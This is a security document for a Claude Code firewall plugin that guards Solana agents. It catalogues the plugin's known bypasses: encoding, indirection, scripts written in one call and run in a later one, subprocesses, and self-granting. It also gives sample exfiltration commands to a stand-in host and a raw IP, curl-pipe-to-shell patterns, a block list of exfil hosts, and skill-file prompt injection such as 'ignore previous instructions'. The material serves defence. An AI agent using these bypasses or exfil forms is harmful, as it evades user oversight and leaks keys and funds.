# Security

## What this plugin cannot protect on its own

> [!WARNING]
> **safe-ai-skill's firewall is hook-level string analysis, and it has known holes.** A hook gets the text of a tool call before it runs (PreToolUse) or the tool's output after it ran (PostToolUse), and answers with no opinion, ask, deny or a rewritten output. That is all it can do. It can't see what a command does once it starts, can't stop a process the command spawns, and has no view of anything that doesn't go through a Claude Code tool call. Every gate is string and semantic analysis of model-written text. Each adversarial review round of this engine found new bypasses, and we don't think that tail is exhausted.
>
> **The [solana-ai-kit](https://github.com/solanabr/ai-kit) implementation (OS sandbox plus permission rules) closes most of these holes. Run both**, or run Claude Code's own sandbox with the recommended `denyRead` and `deniedDomains` entries below. A Claude Code plugin can't ship `sandbox` or `permissions` settings (Claude Code drops both keys from a plugin), so this plugin can't give itself the layer that would close most of them. That layer comes from your settings or from a kit that writes them.

The tier ([docs/tiers.md](docs/tiers.md)) changes how much this plugin denies, never what a hook can see. The tier `off` is not a switch that turns the hooks off, and `high` is not a sandbox.

### Known holes

Kit columns describe solana-ai-kit 2.4.0 (rule set 7). The scope split between the kit and this plugin is proposed in [ai-kit#264](https://github.com/solanabr/ai-kit/issues/264) and its docs in [ai-kit#265](https://github.com/solanabr/ai-kit/issues/265); the kit still pins safe-ai-skill 1.0.0 until it moves its pin.

| Hole | Why a hook can't close it | What closes it | Still open with the kit |
|---|---|---|---|
| **Cross-call write-then-run.** A script written with Write or `cat > x.sh` in one call, run by name in a later call. | Each call is judged alone. The call that runs `./x.sh` contains no secret path and no Solana verb. (1.1.0 links a script written and run in the same command line, not across calls.) | **Kit sandbox (Relaxed and up):** `denyRead`, `denyWrite`, the `allowWrite` fence and `deniedDomains` apply to the script's own syscalls, whoever wrote it. | A script run from a command line led by one of the kit's `excludedCommands` (`surfpool`, `anchor test`, `git push/pull/fetch`, `gh pr/run/issue`) runs unsandboxed. So does anything `anchor test` starts. |
| **Encoding and indirection.** `base64 -d`, `$'…'` quoting, `G=solana; $G transfer …`, paths built at runtime, `python3 -c` or `node -e` one-liners. | The forms are unbounded. A parser recognises the forms it was written for. 1.1.0 follows common wrappers and `FOO=1` prefixes and treats unreadable Solana-family code as an `ask` (a `deny` at High), which narrows this, not closes it. | **Kit sandbox**, as above. **Kit High** also turns on `blockReadsOutsideWorkingDirectories`, which makes Claude Code ask on an interpreter one-liner whose path it can't resolve. | On-chain gating has no sandbox equivalent: a disguised `solana transfer` is stopped only if a parser recognises it. The kit's own hook parser has similar open evasions, which it documents. |
| **Same-UID code outside the sandbox.** A subprocess, compiled helper, test suite, `build.rs`, postinstall script or MCP server process reading `~/.ssh`, `.env` or a keypair, or rewriting this plugin's grants, pins, tier file or shim. | Hooks see tool calls, not processes. This plugin's state lives in user space. The HMAC makes tampering detectable, not impossible. | **Kit sandbox** for processes started by sandboxed Bash: `denyRead` on credentials, and writes outside `allowWrite` refused, which keeps Bash out of `~/.claude/plugins/data` [unverified: follows from the kit's `allowWrite` list, not tested]. **Kit permission rules:** `Edit(/.safe-ai-skill/**)` at every tier, and `Edit()` deny on `~/.claude/plugins/` at High. | MCP server processes run outside the sandbox at every tier, and so do excluded commands. `anchor test*` and `surfpool *` run unsandboxed with access to the home credential stores; only a container closes that. The kit gates `context-mode` by hook and denies some MCP executors by name at Medium and High. Every other server is ungated. |
| **Values already in context.** Once a secret has been read, printed by a test, or returned by an MCP tool, it has gone to the model provider and into `~/.claude/projects/**/*.jsonl`. From there it can reach memory and indexing plugins, MCP tool arguments, and files the agent writes and later commits. | A hook can stop a read. It can't recall a value. Redaction rewrites only the tool output it is shown, and misses low-entropy secrets under neutral key names. | **Nothing closes the provider path.** **Kit Medium and High** deny commands reading transcripts back (`denyRead` on `*.jsonl`). This plugin denies the Read tool on `~/.claude/projects/**`. | All of it, at every tier. The only control is not reading the value. That's why this plugin denies raw `.env` reads by default even when the kit would allow them. |
| **Egress.** `WebFetch https://sink.example/?d=<value>`, a value encoded into a hostname lookup, a raw IP literal (`curl https://203.0.113.5/`), a redirect, a request to a request-bin, tunnel or paste host, `git push` to a new remote, publishing. | 1.1.0 ships no exfil tripwire (planned, [#19](https://github.com/solanabr/safe-ai-skill/issues/19)). It denies a secret file sent by path (`curl -d @.env`, `-T`, `-F`, `scp`), because that is a read of the file, and asks on an inline `curl`/`wget` POST to a non-localhost host (below High, an inline body to a known Solana RPC host has no opinion). It doesn't gate requests to listed exfil hosts, WebFetch or WebSearch, and DNS is not a tool call. | **Kit sandbox `deniedDomains`** (70/79/84 known request-bin, tunnel and paste hosts) for sandboxed Bash subprocesses. **`egress-guard`** blocks secret files sent by `curl`/`wget` at Relaxed and up, and the kit gates git publish and force push. | WebFetch: the kit allows `WebFetch(*)`, and whether `deniedDomains` applies to it is [unverified]. Close it with `WebFetch(domain:…)` deny rules in your own settings. DNS exfiltration through either layer: [unverified]. A denylist covers only the hosts on it. An allowlist (`strictAllowlist`) works only from user or managed scope, never from project files. |
| **Bash writes to `.env`.** `sed -i`, `perl -pi`, `python3 -c "open('.env','w')…"`. | Write, Edit and MultiEdit to env files are denied at Medium and High, and an agent-run `env set\|unset` too. A write through Bash isn't recognised as a write. | **Kit sandbox `denyWrite`**, once the kit implements it (it has no `.env` rule at any tier today). Add `**/.env` to your own `denyWrite`. | All of it today. |
| **Directory search.** Grep and Glob are not in the default toolset on native Claude Code 2.1.304 (observed), so searches go through Bash `grep`/`rg`. | 1.1.0 appends credential exclusions to a directory Grep, including one rooted at or above `$HOME`, which closes the 1.0.1 leak where a directory-wide Grep could return `.env*` contents. When a search goes through Bash, the secrets gate pattern-matches reader commands, which the spec calls a nudge, not the control. | **Kit permission rules:** `Read()` deny covers Read, Grep and Glob for credential paths at every tier. **Kit sandbox `denyRead`** covers `grep`/`rg` on those paths at Relaxed and up. | The kit has no `.env` rule, so a Bash `grep -r KEY .` can return `.env` contents. Add `.env` to your own sandbox `denyRead` (below). |
| **A localhost RPC proxy that forwards to mainnet.** | Clusters are identified by host, so a proxy on `localhost` counts as an identified localnet. | Nobody. Simulation and a guarded signer are out of scope. | All of it. |
| **Engine crash.** | The confidentiality gates (`gate-read`, `gate-bash-secrets`, `gate-tamper`) run with `onFailure: continue`, so a crash fails open with one stderr line. `gate-bash` (which runs for every Bash call), `gate-mcp` and `gate-skill` block, so a crashing engine blocks every Bash call. | **Kit sandbox**, which doesn't depend on the engine. | Everything the sandbox doesn't cover. |
| **Env files loaded into a process.** A short allowlist of loaders may name an env file: `node`/`bun --env-file F <script>`, `deno run --env-file F <script>`, `docker run`/`create --env-file F <image>` with no command, `docker compose --env-file F up` (and `start`, `restart`, `build`, `pull`, `down`, `stop`, `ps`, `logs`), and `dotenv`/`dotenvx` running one of those or a build tool (`npm start`/`test`/`run <name>`, `pnpm`, `yarn`, `next`, `vite`, `anchor`, `cargo`, `make`). The values go into the process, not the transcript. | **An exempted loader runs project code the agent can edit**: the script file, `package.json` scripts, a Makefile, a build script, the image. The exemption cannot stop that code from printing the loaded values once it runs; it only refuses the forms that print on the command line (inline code, `data:`/`http(s):` modules, piped input, a command after the image, `exec`/`dlx`/`env` and other compose subcommands). | **Kit sandbox** (or Claude Code's own) with `.env` in `denyRead` is the control: a sandboxed loader then cannot read the file at all. Values that reach the output are redacted only when they are literal values of the project's env files. | A loader the kit excludes from the sandbox (`excludedCommands`) still reads the file. |
| **Code run through an MCP executor.** context-mode's `ctx_execute` and similar tools run shell or Python code given as an argument. | Shell code (`ctx_execute` with a shell language, `ctx_batch_execute` commands, any `command`/`cmd`/`script` argument) gets the Bash checks. Other languages get only their string literals checked, as paths and as shell commands; a Solana CLI named there asks (deny at High). Paths built at runtime, encodings and imported code are not seen. | **Kit hooks** gate `context-mode` payloads; the kit denies some MCP executors by name at Medium and High. | MCP server processes run outside the sandbox. |
| **Output redaction limits.** The `redact` hook rewrites the result of `Bash`, `Read`, `Grep` and MCP tools (matcher `Bash\|Read\|Grep\|mcp__.*`). Results of other tools (`WebFetch`, `WebSearch`, `Agent`, `Glob`, the Windows `PowerShell` tool) are not scanned. Seed phrases (BIP-39 English list, any case; words joined by whitespace, `,` `"` `'` `[` `]` or numbering such as `1.` `2)`): **without a keyword**, each line of list words is checked on its own, as is a run of list words that wraps over lines: it is redacted when it is exactly 12, 15, 18, 21 or 24 words and its checksum validates, or when it is at most 18 words and a checksum-valid window sits with no more than 3 extra list words on each side (and at least 8 distinct words), so a file of one phrase per line has every line redacted; a phrase with 4 or more list words directly beside it, two phrases written back to back on one line, a typo, another language's list or non-list words are missed. **With a keyword** (`mnemonic`, `seed`, `phrase`, `recovery` or `secret` as a whole word, plural or camelCase part, in the same string and outside the run itself; a keyword among the first or last 3 words of a list or phrase-shaped run, as in `seed phrase <words>`, is cut off the run and counts), a run of 12 to 48 list words is redacted whatever its checksum, so is a run of 12 to 48 words of 3 to 8 letters joined as above in which at most one in six is off the list and those are lowercase (typos), and so is any run of 12 or more lowercase 3-to-8-letter words separated by single spaces with the keyword outside it (the 1.0 rule: the whole run up to 48 words, else its first 24). A wrapped run, or a single line, of more than 48 list words is taken for a wordlist: neither the whole-run checksum nor the keyword rules redact it (only the 1.0 rule can still take the first 24 words of a single-spaced run that also holds a non-list word); the lines inside a longer multi-line block are still checked one by one. "Same string" means one JSON string of the tool result: a keyword in `stderr` does not apply to `stdout`, and each MCP content block is separate. Prose made only of 12 to 18 list words in a row can be redacted by chance (1 in 16 per 12-word window, 1 in 256 at 24), and the keyword rules redact ordinary clauses such as `decrypts the given secret box using the key and the nonce` when they are 12 or more short lowercase words; the repository's docs and the reviewer's corpora of natural text and code had no bare match outside test fixtures. The checksum work per string is capped at 349,525 exact-length and 2,097,152 window checks, which is more than any run layout in an 8 MiB payload can use, so padding before a phrase cannot exhaust it. Published BIP-39 test vectors are redacted in output like any other phrase (a test fixture holding one is hidden from the model). The prompt guard blocks only checksum-valid phrases (the bare rules above), never on a keyword alone, and lets the 24 published BIP-39 English test vectors through when one is the whole match; a pasted phrase with a typo is therefore not blocked. A payload over 8 MiB, an engine crash or a hook timeout (10 s) passes the output unchanged (`onFailure: continue`). | Claude Code's `updatedToolOutput` (hooks reference, "PostToolUse decision control") replaces only what Claude sees: the tool has already run, and telemetry such as OpenTelemetry tool spans captures the original output before the hook runs. For built-in tools a replacement that does not match the tool's output schema is ignored, so the hook keeps every field and type and changes string values only. The reference does not say whether the transcript file stores the original or the replaced result. | Not reading the value: the read gates, and the **kit sandbox** `denyRead`. | All of it. |
| **Heuristic evasion in packs.** A skill pack that evades the rule-based scan. | The scan is static analysis of text. | Pins and drift detection narrow it. The kit's CI review covers kit packs only. | Packs outside the kit. |

Holes neither layer closes from inside a project:
- a repository's committed `.claude/settings.json` `env` block, which can replace any hook through `PATH` or loader variables (Claude Code's folder trust is the only control);
- the `--settings`, `--permission-mode` and `--setting-sources` flags, and `CLAUDE_CONFIG_DIR`;
- PowerShell-only Windows, where the engine fails open and Bash matchers don't see the PowerShell tool;
- your own `!` shell commands [unverified whether any hook fires];
- the nonce secrecy of a confirmation code if a hook `systemMessage` reaches the model (checked live before each release).

**Known cost, not a hole.** Reads of `~/.claude/projects/**` are denied, and that includes the agent's own auto-memory files (`~/.claude/projects/<project>/memory/…`). The agent can't read them with its tools. The deny covers the whole tree because it also holds the transcripts that record hook messages.

**What 1.0.1 listed as known limitations, in 1.1.0.** Output redaction works (every tier). A directory-wide Grep gets credential exclusions (above). A Solana command behind a wrapper or `FOO=1` prefix is parsed and gated (`gate-bash` now runs for every Bash call); one written to a file in one call and run in a later one is still not seen. Writes to `.env` through Bash, and exfiltration to unlisted or listed hosts and raw IPs, are still open (above).

### Recommended setup

Use one of these alongside the plugin:

1. **Recommended: run both, this plugin and solana-ai-kit at Relaxed or above.** The kit generates the sandbox, permission rules and exfil host list that close the holes marked "Kit sandbox" and "Kit permission rules" above, and its four guard hooks cover git, publish and fetch-and-execute, which this plugin doesn't. Prefer Medium or High when reading untrusted code.
2. **Without the kit: Claude Code's own sandbox**, configured by you, with the `denyRead` and `deniedDomains` entries below. Put this in `~/.claude/settings.json` (user scope), not in a project file. A project's `.claude/settings.local.json` can set `sandbox.enabled: false` or widen `allowRead`.

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "denyRead": [
        "~/.ssh", "~/.gnupg", "~/.aws",
        "~/.config/solana/id.json",
        "~/.netrc", "~/.npmrc", "~/.git-credentials", "~/.config/gh/hosts.yml",
        "~/.claude/projects",
        "**/.env", "**/.env.local", "**/*-keypair.json"
      ],
      "denyWrite": ["**/.env", "**/.env.local"]
    },
    "network": {
      "deniedDomains": [
        "webhook.site", "*.webhook.site", "*.requestbin.net", "*.pipedream.net",
        "*.ngrok.io", "*.ngrok-free.app", "*.trycloudflare.com",
        "pastebin.com", "transfer.sh", "0x0.st", "file.io"
      ]
    }
  },
  "permissions": {
    "deny": [
      "Read(~/.ssh/**)", "Read(~/.aws/**)", "Read(~/.config/solana/id.json)",
      "WebFetch(domain:webhook.site)", "WebFetch(domain:pastebin.com)"
    ]
  }
}
```

Notes on that snippet:
- **Check the glob syntax** (`**/.env`, `*.webhook.site`) against your Claude Code version's sandbox documentation [unverified across versions].
- **Expect sandboxed commands that sign with the default wallet to fail** once `~/.config/solana/id.json` is denied. Point `--keypair` or Anchor's `wallet =` at a dedicated devnet key outside the denied set, or run those commands yourself.
- **Expect sandboxed commands that load `.env` themselves** (a test run with dotenv, for example) to fail under `denyRead` on `**/.env`. If you need them to run, drop that entry and accept the subprocess hole this plugin can't close.
- **`denyWrite` on `**/.env` also stops a sandboxed `safe-ai-skill env set`.** Run that from your own terminal.
- **The domain list is a sample.** The full list is `policy/shared/exfil-hosts.list` in this repo (70, 79 and 84 hosts by tier). `safe-ai-skill doctor` checks your sandbox settings and prints a `denyRead` snippet generated from the shared credential list; it does not print `deniedDomains`.
- **Don't add a `denyRead` for `.env.schema` or `.env.example`.** This plugin keeps both readable on purpose.

### Using with solana-ai-kit

The kit's `stbr` marketplace installs this plugin. Don't add this marketplace too: with two copies installed, only one copy's hooks register. The kit pins a specific commit of this plugin, so a release here reaches kit users only when the kit moves the pin.

**Division of labour** (see [docs/tiers.md](docs/tiers.md)):
- **The kit enforces:** the OS sandbox, permission rules, tier selection, and the git, publish, fetch-and-execute, `gh` and MCP tool-name gates.
- **This plugin enforces:** cluster-aware on-chain gates, spend caps and grants, key material and home credential store read blocking, `.env` tooling and redaction, and the session-start supply-chain check. A best-effort exfil tripwire is planned ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)); until it ships, the kit's sandbox `deniedDomains` (or your own) covers known exfil hosts.
- **Duplicated hard denies are kept as defence in depth,** for example default-wallet `solana-keygen --force`, and irreversible actions on mainnet or an unidentified cluster. Two denies never conflict.

**The tier is an input.** One user-scope tier file, written only by `safe-ai-skill tier <t> [--project]` (a proposed kit change has `/firewall` run it). Raising applies at once. Lowering applies only after a confirmation you type in the prompt. The kit's `.claude/security.json`, repo policy files and env variables can only raise the tier, because a project file or the agent can rewrite them. A project `.env` stays unreadable to the agent at every tier; the user-scope opt-in ships disabled in 1.1.0 release builds.

**Duplicate prompts.** Both hook sets run on every Bash call. Claude Code is expected to merge hook decisions as deny > ask > allow, so you should see one dialog [unverified on current Claude Code]; the shared conformance corpus asserts that no action is both asked by the kit and asked or allowed by this plugin in the end state. Until the kit moves to the split, the reason text can come from either engine, and a plugin `allow` (a grant, a within-cap devnet transfer) can be overridden by a kit `ask`. Under `claude -p` every ask is a denial, in both layers.

## What is protected

**Transactions and deploys.** Every `solana`, `spl-token`, and `anchor` CLI command that moves value, changes program authority, deploys or upgrades a program, or closes an account is intercepted before execution by the `gate-bash` PreToolUse hook, which runs for every Bash call so that wrapped forms (`env FOO=1 …`, `bash -c '…'`, `timeout 5 …`, path-qualified binaries) reach it too. Value-moving, authority-changing, and staking MCP tool calls (names matching `transfer|sign|swap|send|withdraw|burn|pay|upgrade|stake|delegate|mint|bridge|lend|borrow`) are intercepted by `gate-mcp` (ask, deny at High). Hard guards are never relaxed: authority changes and account closes ask for user approval (they deny at the High tier on mainnet or an unidentified cluster), and secret reads are denied. A mainnet deploy asks (deny at High) and a confirmed `deploy` grant can allow it below High. A command line chaining two or more gated actions is never covered by a grant. Irreversible actions (`--final`, `program close` (program or buffer), `spl-token close-mint|close|burn`, `authorize --disable`, IDL erase/close, `close-vote-account`) deny on mainnet or any cluster not positively identified as localnet or devnet, and ask on an identified localnet or devnet; default-wallet destruction (`solana-keygen --force`, overwriting or deleting `id.json`) denies on every cluster. Nothing relaxes these: not a grant, a tier, a repo setting or an env variable. See [docs/tiers.md](docs/tiers.md).

**Secret files and credential stores.** Solana keypairs, `.env` files, `.pem` files and `~/.config/solana/**` (except `cli/config.yml`), `~/.ssh/**` (except `config`, `known_hosts`, `*.pub`), `~/.gnupg`, `~/.aws`, `~/.kube/config`, registry and git-host tokens, keychains and password-manager stores, browser profiles and wallet-extension data are read-denied by `gate-read` for Read and Grep tool calls (Glob lists names only and is not gated) and MCP path arguments and by `gate-bash-secrets` for Bash commands, at every tier including Off. So are commands that print a credential (`gh auth token`, `git credential fill`, `security find-generic-password -w`, `op read`, `bw get`, …). A directory Grep gets credential exclusions appended; a Grep rooted in a credential store is denied. A [varlock](https://varlock.dev) `.env.schema` and `.env.example` stay readable, but a Read (or Grep with a file path) of a schema that holds key material or a literal credential value, is over 64 KiB or is not a regular file is denied; Bash `cat` and Grep with a directory plus glob are not content-checked. A project's `.safe-ai-skill/policy.yaml` can remove either allow. Raw reads of project env files are denied at every tier; the user-scope `safe-ai-skill tier --env-read ask|tier` opt-in is accepted but inactive in 1.1.0 release builds (it needs the `env-read-opt-in` build feature, and then only while the sandbox is declared on). Naming an SSH key as the identity of `ssh`, `scp` or `sftp` is allowed; any other command naming a credential store is denied. Details are in the README and docs/tiers.md. Output redaction runs on every tier: key, seed, PEM and vendor-token patterns and the literal values in the project's env files are replaced in Read, Bash, Grep and MCP output (the response of an opted-in raw read is not scrubbed). Its limits are listed under Known holes. It misses low-entropy secrets under neutral key names.

**Prompt content.** `prompt-guard` (UserPromptSubmit hook) blocks prompts that contain raw private keys or seed phrases before they reach the model. Only checksum-valid phrases block, and the 24 published BIP-39 English test vectors don't; the seed-phrase rules are under Known holes ("Output redaction limits").

**Supply chain.** Every session start runs `verify session` over the installed skills directories, each `ext/` git submodule independently, and the project's `.mcp.json`. It makes no network calls, and it does not read `.claude/settings.json` or the catalog (`registry verify` audits the catalog on demand). The `@latest` MCP posture is flagged as INFORMATIONAL; safe-ai-skill does not treat it as an error when a hub keeps its MCPs `@latest` by design. Since 1.1.0 content that drifts from its pinned hash or git SHA is **blocked in place**: the Skill tool, a typed `/name`, and reads or Bash access inside the pack are denied until you review it, run `safe-ai-skill verify approve <name>` in a terminal and confirm the code safe-ai-skill shows you. A combination rule (for example an exfiltrating `` !`cmd` ``) blocks the same way and no approval clears it. A pack the sweep could not fully scan in its time budget is denied until a later sweep scans it. The action follows the tier: at Off these findings are reported, not denied; from Relaxed they deny in place; a HIGH heuristic (unreviewed) denies only at High, until `verify trust` or `approve`, and a repo `packs.lock` cannot clear it. Packs are moved only with `supply_chain.on_block: move`, never when git tracks them. The sweep covers the project's `.claude/skills`; `~/.claude/skills` only when a project's `.safe-ai-skill/policy.yaml` adds it to `supply_chain.verify_skills_dirs` (the only dir outside the project a project may add), apart from packs installed there with `install --from`.

**Install-script execution.** Runtime `curl|bash`, `wget|bash`, and `curl|sh` patterns are intercepted by `gate-bash-secrets` (unconditional, microsecond matching) before the pipe executes. The default policy is `exec_install_scripts: ask` — the user sees the URL and script preview before approval.

## Threat model

safe-ai-skill protects against a careless model and prompt-injected instructions. It is not a sandbox, and its [known holes](#known-holes) are listed above: code that runs unsandboxed as your user can rewrite any user-space state, including grants, pins, the tier file and the plugin's own files. The Claude Code sandbox is the hard boundary, so run Claude Code with it on if you need one. The self-grant tripwire (below) and the gates make tampering by the agent deny or ask, never allow, but they are not a defence against a process that is already running arbitrary code.

### `ext/` submodule supply chain

safe-ai-skill is general-purpose: it verifies whatever `ext/` submodules, skills, and MCPs a given setup ships — any hub, any count, or none. The walkthrough below uses `solanabr/solana-ai-kit` as a concrete worked example because it ships a large, heterogeneous set of submodules; the same verification applies unchanged to any other configuration.

solana-ai-kit, for example, ships 18 third-party `ext/` git submodules: third-party security tools, DeFi protocol SDKs, NFT tooling, and infrastructure integrations (including `ext/ghostsecurity`, `ext/trailofbits`, `ext/jupiter`, `ext/metaplex`, `ext/helius`, `ext/sendai`, `ext/vercel`, and others). Each is an independent supply-chain unit with a different origin, maintainer, and risk profile.

**What can go wrong per submodule:**
- Telemetry preambles in SKILL.md files that POST skill-invocation metadata to third-party endpoints.
- `curl|bash` installer patterns embedded in skill content (e.g., `ext/ghostsecurity`).
- Prompt injection in SKILL.md content (hidden HTML comments, Unicode bidirectional control characters, lookalike substitutions).
- Dependency changes in a submodule's npm/Cargo manifests that introduce CVEs.
- Compromised upstream repository — a submodule commit SHA can change on any `git submodule update`.

**safe-ai-skill's response:** each submodule is walked individually by the `verify session` sweep at `SessionStart`. The git SHA is pinned on first seen (TOFU). On any subsequent session where the SHA has changed — whether from an explicit `resync.sh` update or a stealth mutation — the submodule is blocked in place (High findings at `path:line`) and its paths and skills are denied until the user reviews the changes, runs `safe-ai-skill verify approve <name>` and confirms it.

**No special-casing:** some submodules carry known supply-chain risks — attacker-mutable telemetry endpoints, unsigned tarball installers, and global Bash/Read permission grant patterns. safe-ai-skill treats every `ext/` submodule identically: telemetry preambles and installer patterns are flagged generically by the rule engine (`crates/engine/src/verify/rules/`), and `install` neutralizes telemetry preambles; no submodule is special-cased.

### `@latest` MCP posture

solana-ai-kit configures all 7 MCP servers with `@latest` versions in `.mcp.json`. safe-ai-skill flags these as INFORMATIONAL (LOW) — not as errors — because this is a deliberate posture choice by the kit maintainers, not an oversight. The risk is concrete: an `@latest` entry silently pulls whatever is newest on each install, creating a rug-pull vector where a compromised new release is auto-applied.

safe-ai-skill's response: flag at session start, listing each unpinned server at its `.mcp.json` line. It never rewrites `.mcp.json` silently; `safe-ai-skill add mcp` writes exact versions for the entries it adds, and the user decides when to pin the rest.

**What safe-ai-skill does NOT do:** safe-ai-skill does not gate MCP calls solely on the basis of `@latest` pinning. The runtime `gate-mcp` hook gates by tool name and payload. An `@latest` entry that calls a safe read-only tool is allowed; an entry that calls a sensitive tool is gated regardless of whether it is pinned.

### High-risk catalog classes

solana-ai-kit's `skill-registry.json` includes entries classified by safe-ai-skill as high risk:

| Class | Representative entries | Risk |
|-------|----------------------|------|
| `wallet_signing` | `phantom-mcp` | Requests Phantom wallet to sign arbitrary transactions on behalf of the agent. If the agent is compromised or manipulated, this class of tool can drain the connected wallet. |
| `key_custody` | `x402-proxy-mcp` | Holds BIP-39 mnemonic or derived keys for x402 payment channel operations. Key material is exposed to the MCP process boundary. |
| `installer_script` | `ghostsecurity`, others with `curl\|bash` setup | The `setup_command` or installer invokes a network fetch piped to a shell. The fetched content is not verifiable at catalog-entry-audit time; it can change between audit and execution. |

Entries in `wallet_signing` and `key_custody` force `ask` under the default policy (the class decisions live in the plugin's `default.policy.yaml`; a project's `.safe-ai-skill/policy.yaml` cannot change the catalog). Entries in `installer_script` trigger the `exec_install_scripts` policy gate, which a project policy can only move toward `deny`. At runtime, tools from approved `wallet_signing` entries are gated by `gate-mcp` with a risk-class header in the approval prompt — the user is reminded of the class on every invocation.

### TOCTOU and simulation spoofing

A transaction can pass simulation while the on-chain execution differs (e.g., due to account state changes between simulation and confirmation, or a maliciously constructed instruction sequence that looks benign in simulation). safe-ai-skill gates the *execution command* — the `anchor deploy`, `solana transfer`, or MCP call — not the simulation. This does not fully mitigate sophisticated TOCTOU attacks but ensures that at minimum the execution requires user awareness and approval for high-risk actions, regardless of simulation results.

### Over-permissioned agents

solana-ai-kit sets `enableAllProjectMcpServers: true`, which pre-approves all project MCP tools. safe-ai-skill's `deny` decisions from PreToolUse hooks hold even when `enableAllProjectMcpServers: true` is set — this is a verified property of the Claude Code hook execution order: PreToolUse runs before the permission check, and `permissionDecision: "deny"` is not overridable by project settings. The hard guards (`set_authority`, `account_close`, irreversible on-chain actions, `secret_read`) are enforced unconditionally.

### Secret exfiltration

The naive-exfil tripwire (a network-capable command fed a secret, and requests to the 70/79/84 known request-bin, tunnel and paste hosts of `policy/shared/exfil-hosts.list`) is **planned, not shipped** ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)). In 1.1.0, `gate-bash-secrets` denies a network command that takes a key file, credential store or project env file by path (a read of that file, at every tier) and asks on an inline `curl`/`wget` POST body to a non-localhost host, except an inline body whose every destination is a known Solana RPC host ([docs/tiers.md](docs/tiers.md#exfiltration-tripwire-planned) lists them), which has no opinion below High and asks at High. Requests to listed hosts, values already in context, raw IP literals, redirects, DNS and cross-call indirection are not stopped (see [Known holes](#known-holes)); solana-ai-kit's sandbox `deniedDomains`, or your own, closes the host list for sandboxed commands.

Exfiltration vectors in a typical solana-ai-kit session:

- **Keypair file reads** — `Read` tool calls on `~/.config/solana/id.json` or project keypair files; Bash `cat` commands.
- **Telemetry preambles** — SKILL.md files in `ext/` submodules can contain bash blocks that POST to third-party endpoints on skill invocation. `gate-bash-secrets` catches all outbound POST patterns with known telemetry signatures (Convex `/api/mutation`, and config-driven additional endpoint patterns).
- **Environment variable leakage** — `printenv`, `env`, commands that expand `$ANCHOR_WALLET` or `$SOLANA_KEYPAIR` into arguments.
- **`curl|bash` runtime execution** — an agent instructed to run a setup script could fetch and execute arbitrary code. `gate-bash-secrets` intercepts these before the pipe executes.

### PII in prompts

Users occasionally paste private key material, seed phrases, or other sensitive data into prompts when troubleshooting. `prompt-guard` matches against these patterns at UserPromptSubmit and blocks the prompt with a reason message before it reaches the model.

### MCP CVEs

MCP package vulnerabilities are a concrete, documented risk. safe-ai-skill addresses this at install time: `safe-ai-skill add` queries osv.dev for an exact, non-local npm source (for example `add mcp`'s resolved `pkg@version`) before installation (skip with `--offline`). The session sweep and `verify` make no network calls. The osv.dev API requires no authentication.

### Tool poisoning and prompt injection

Malicious skills can embed instructions targeting the language model in SKILL.md content: hidden HTML comments, "ignore previous instructions" text, Unicode bidirectional control characters, and lookalike unicode substitutions. The rule engine (`verify/rules/`) scans for these patterns before any pack content is pinned; in a SKILL.md description an injection phrase or URL with an action verb is part of the `description_injection` combination (BLOCK). A pack with a code HIGH finding is reported as unreviewed at session start and held at `install`; documentation findings are warnings.

## Design guarantees

**Hard guards are unconditional while the firewall runs.** The hard guards — `set_authority`, `account_close`, irreversible on-chain actions and `secret_read` — are enforced by the engine binary regardless of the active tier (the tier `off` included), any time-boxed grant, or any project policy override; no engine flag or configuration relaxes them. In practice: authority changes and account closes ask (and deny at High on mainnet or an unidentified cluster), secret reads are denied, and irreversible actions deny on mainnet or an unidentified cluster and ask on an identified localnet or devnet. Non-final deploys, to mainnet included, are counterparty actions a confirmed `deploy` grant can allow below High; `program close` in any form (a buffer included) is irreversible and no grant covers it. Every `deny` row of the tier table holds at the tier `off`; only `SAFE_AI_SKILL_DISABLE=1` turns the hooks off. They stop applying only when the firewall itself is off (not when the tier is `off`): when the user sets `SAFE_AI_SKILL_DISABLE=1`, or when the engine cannot run on the platform (below; Solana CLI commands still ask). SessionStart reports both.

**Fails open only when the engine cannot run, never past a broken gate.** If no engine runs on this platform (no matching prebuilt, not an executable for this OS, exec failure 126/127), the `bin/safe-ai-skill` shim keeps Bash calls naming the Solana CLIs (and the Skill gate) at `ask`, reports the firewall INACTIVE at SessionStart, and lets every other call continue with a one-line notice. An engine crash blocks `gate-bash` (every Bash call), `gate-mcp` and `gate-skill` (exit 2) and is reported at SessionStart. `SAFE_AI_SKILL_STRICT=1` turns every one of these cases into exit 2 (block). `SAFE_AI_SKILL_DISABLE=1` turns the hooks off unless strict mode is set or the committed `.claude/settings.json` mentions it or can't be read (a repo can't disable the firewall); SessionStart reports it either way. The shim never builds from source and never runs a binary outside its own directory. `gate-bash` and `gate-skill` set `onFailure: block`, the others `onFailure: continue` (honoured from Claude Code 2.1.295).

**Residual risk: a repo's settings env is trusted code.** Claude Code applies the `env` of a project's `.claude/settings.json` to every hook. That file can already set `PATH`, `DYLD_*` or `LD_PRELOAD` and so run its own code in place of any hook, so the shim cannot defend against it. The `SAFE_AI_SKILL_DISABLE` check is a plain-text match on that file, which stops the obvious case, not a determined repo. Only open repositories you trust with your Claude Code session, and review `.claude/settings.json` in unfamiliar ones.

**Self-grant tripwire.** It stops the plain ways an agent could loosen the firewall through its own tools; it is not a guarantee. `gate-bash-secrets` denies Bash commands that run `safe-ai-skill confirm|revoke`, `verify approve|trust`, `install` or `add` (which pin or re-pin packs), the hook-only bare `verify` / `verify session` (it pins packs it has not seen before), or a hook subcommand (`prompt-guard`, `pending-notice`, `redact`, any `gate-*`), or that reference protected state, and `gate-tamper` (`Write|Edit|MultiEdit|NotebookEdit`) denies writes to it. `allow` and `tier` stay open to the agent: a grant or a tier lowering only records a request, which takes effect when the user types the code safe-ai-skill shows them alone. A nested Claude Code session (`claude -p …`) that mentions `safe-ai-skill confirm` is denied, and any other non-interactive one asks. Protected state is the plugin data dir (grants, the tier file, spend ledger, pending requests, generations, the state key, locks, the audit log), the legacy `~/.safe-ai-skill` dir, the installed plugin and its `hooks.json`, and the state files of a project `.safe-ai-skill/` dir; a project's `policy.yaml` stays editable because it can only tighten. Reads of the state key and of Claude Code transcripts (`~/.claude/projects`, which record hook messages) are denied too. A command or payload too large or complex to scan asks instead of passing. Run the denied commands yourself in a terminal. This is a tripwire, not a sandbox: encoded commands, variable indirection or scripts written now and run later can get past it; the Claude Code sandbox is the boundary.

